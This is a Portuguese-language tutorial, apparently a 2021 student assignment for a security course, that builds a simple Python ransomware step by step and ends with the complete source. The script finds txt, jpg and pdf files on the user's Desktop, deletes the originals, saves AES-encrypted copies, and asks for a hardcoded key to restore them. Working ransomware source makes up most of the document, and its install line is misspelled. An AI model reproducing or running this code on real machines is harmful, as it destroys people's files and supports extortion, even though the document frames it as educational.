# Ransomware

Hoje faremos um ransomware simples, que é um tipo de vírus que bloqueia dados do computador da vitima e pede resgate para que eles voltem a ser acessíveis. 


     Começaremos  importando as bibliotecas necessárias para a criação do código;

para isso vá em seu terminal de preferência e importe a biblioteca "pyaes" com:

```bash
pip isntall pyes
```

     

E agora coloque em seu código as bibliotecas necessárias: 

```python
import os
import glob
import pyaes
from pathlib import Path
```

     Coloque agora as extensões que deseja criptografar:

```python
lista_arq = ["*.txt"] #*.jpg","*.txt","*.pdf","*.png","*.mp3","*.mp4
```

     Usando a biblioteca **path** e **os** caminhamos pelo sistema (Desktop) para fazer a verificação dos arquivos:

```python
try:
    desktop = Path.home() / "Desktop"

except Exception:
    pass

os.chdir(desktop)
```

     Aqui definimos a função ***`encode`*** para criptografar os arquivos mais tarde, e começamos a usar a biblioteca **PyAES** para isso, apagamos o arquivo original e substituímos por um novo criptografado, e também estabelecemos uma chave de 16bits para recuperação dos arquivos:

```python
def encode():
    for files in lista_arq:
        for format_file in glob.glob(files):
            print(format_file) 
            f = open(f'{desktop}//{format_file}', 'rb')
            file_data = f.read()
            f.close()
		
		#Apagando arquivo original
            os.remove(f'{desktop}//{format_file}')
            key = b"1a2b3c4d5e7f8g9h"
            aes = pyaes.AESModeOfOperationCTR(key)
            crypto_data = aes.encrypt(file_data)

                #Salvando novo arquivo
            new_file = format_file + ".ransomcrypter"
            new_file = open(f'{desktop}//{new_file}', 'wb')
            new_file.write(crypto_data)
            new_file.close()
```

     Logo após criamos a função ***`decode`*** que tem o papel de descriptografar os arquivos fazendo uso da chave que estabelecemos a cima:

```python
def decode(decrypt_file):
    try:
        for file in glob.glob('*.ransomcrypter'):

            keybytes = decrypt_file.encode()
            name_file = open(file, 'rb')
            file_data = name_file.read()
            dkey = keybytes
            daes = pyaes.AESModeOfOperationCTR(dkey)
            decrypt_data = daes.decrypt(file_data)

            format_file = file.split('.')
            new_file_name = format_file[0] + '.' + format_file[1]

            dnew_file = open(f'{desktop}//{new_file_name}', 'wb')
            dnew_file.write(decrypt_data)
            dnew_file.close()
    except ValueError as err:
        print('Chave inválida!')
```

     Agora vamos para a parte que interessa, onde ransomware age, fazemos a chamada da função ***`encode`*** para criptografar e depois pedimos a chave, se estiver correta chamamos a função ***`decode`*** para que os arquivos sejam descriptografados:

```python
if __name__ == '__main__':
    encode()
    if encode:
        key = input('Seus arquivos foram criptografados, insira a chave para liberação:')
        if key == '1a2b3c4d5e7f8g9h':
            decode(key)
            for del_file in glob.glob('*.ransomcrypter'):
                os.remove(f'{desktop}//{del_file}')
        else:
            print('Chave inválida!')
```

E assim temos nosso Ransomware pronto para uso educacional.

Código completo:

```python
import os
import glob
import pyaes
from pathlib import Path

lista_arq = ["*.jpg","*.txt", "*.pdf"] #*.jpg","*.txt","*.pdf","*.png","*.mp3","*.mp4

#Entra no desktop e faz a verificacao
try:
    desktop = Path.home() / "Desktop"

except Exception:
    pass

os.chdir(desktop)

def encode():
    for files in lista_arq:
        for format_file in glob.glob(files):
            print(format_file) 
            f = open(f'{desktop}//{format_file}', 'rb')
            file_data = f.read()
            f.close()

            os.remove(f'{desktop}//{format_file}')
            key = b"1a2b3c4d5e7f8g9h"
            aes = pyaes.AESModeOfOperationCTR(key)
            crypto_data = aes.encrypt(file_data)

                #Salvando novo arquivo
            new_file = format_file + ".ransomcrypter"
            new_file = open(f'{desktop}//{new_file}', 'wb')
            new_file.write(crypto_data)
            new_file.close()

def decode(decrypt_file):
    try:
        for file in glob.glob('*.ransomcrypter'):

            keybytes = decrypt_file.encode()
            name_file = open(file, 'rb')
            file_data = name_file.read()
            dkey = keybytes
            daes = pyaes.AESModeOfOperationCTR(dkey)
            decrypt_data = daes.decrypt(file_data)

            format_file = file.split('.')
            new_file_name = format_file[0] + '.' + format_file[1]

            dnew_file = open(f'{desktop}//{new_file_name}', 'wb')
            dnew_file.write(decrypt_data)
            dnew_file.close()
    except ValueError as err:
        print('Chave inválida!')

if __name__ == '__main__':
    encode()
    if encode:
        key = input('Seus arquivos foram criptografados, insira a chave para liberação:')
        if key == '1a2b3c4d5e7f8g9h':
            decode(key)
            for del_file in glob.glob('*.ransomcrypter'):
                os.remove(f'{desktop}//{del_file}')
        else:
            print('Chave inválida!')
```

Development and Code for Security - Fabio Cabrini

Global Solutions - 2021

Grupo G

Gabriel Martire Bega         87442    
Enzo Aparecido Viana         88883   
Arthur de Oliveira           89187    
Lucas Venancio Coutinho      89257   
Weslley Leandro Ribeiro      88925   
Vinicius Fernandes           89369
